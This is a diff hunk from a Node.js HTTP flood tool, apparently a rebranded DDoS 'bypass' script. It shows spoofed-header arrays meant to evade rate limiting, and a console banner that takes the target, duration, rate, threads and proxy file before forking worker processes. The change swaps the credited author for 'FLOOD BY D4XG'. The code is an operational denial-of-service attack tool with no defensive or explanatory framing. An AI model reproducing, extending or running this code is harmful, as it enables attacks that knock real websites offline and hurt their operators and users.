@@ -84,15 +84,15 @@ const rateHeaders3=[{'cookie':randstr(15)},{'Expect':'100-continue'},{'Forwarded
 const rateHeaders4=[{'accept-encoding':encoding},{'accept-language':lang},{'Refresh':'5'},{'X-Content-duration':spoofed},{'service-worker-navigation-preload':Math.random()<0.5?'true':'null'}];
 if(cluster.isMaster){
 	console.clear();
-	console.log('HTTP-DDoS bypass by: @Akafastly (Sxpy Azary)'.rainbow);
+	console.log('[!] Attack sent successfully'.red);
 	console.log('--------------------------------------------'.gray);
-	console.log('Target: '.brightYellow+process.argv[2]);
-	console.log('Time: '.brightYellow+process.argv[3]);
-	console.log('Rate: '.brightYellow+process.argv[4]);
-	console.log('Thread: '.brightYellow+process.argv[5]);
-	console.log('ProxyFile: '.brightYellow+process.argv[6]);
+	console.log('[🚀] Target: '.brightYellow+process.argv[2]);
+	console.log('[⌚] Time: '.brightYellow+process.argv[3]);
+	console.log('[🔥] Rate: '.brightYellow+process.argv[4]);
+	console.log('[💻] Thread: '.brightYellow+process.argv[5]);
+	console.log('[📋] ProxyFile: '.brightYellow+process.argv[6]);
 	console.log('--------------------------------------------'.gray);
-	console.log('Note: '.brightCyan+tipsz);
+	console.log('FLOOD BY D4XG');
 	for(let counter=1;counter<=args.threads;counter++){
 		cluster.fork();
 	}
